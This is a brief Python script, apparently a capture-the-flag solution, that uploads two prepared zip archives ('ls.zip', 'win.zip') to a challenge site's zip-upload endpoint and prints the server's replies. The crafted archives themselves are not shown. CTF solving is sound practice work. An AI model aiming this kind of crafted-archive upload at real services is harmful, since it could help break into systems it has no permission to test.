#!/usr/bin/python3
import requests
import os
import json

with open("./ls.zip", "rb") as f:
    data1 = f.read()

url = "https://ls.csa-challenge.com/upload-zip"

s = requests.Session()

response = json.loads(s.post(url, headers= {"Content-Type": "application/zip"},data= data1).text)
print(response["body"])

with open("./win.zip", "rb") as f:
    data2 = f.read()

response = json.loads(s.post(url, headers= {"Content-Type": "application/zip"},data= data2).text)
print(response["body"])
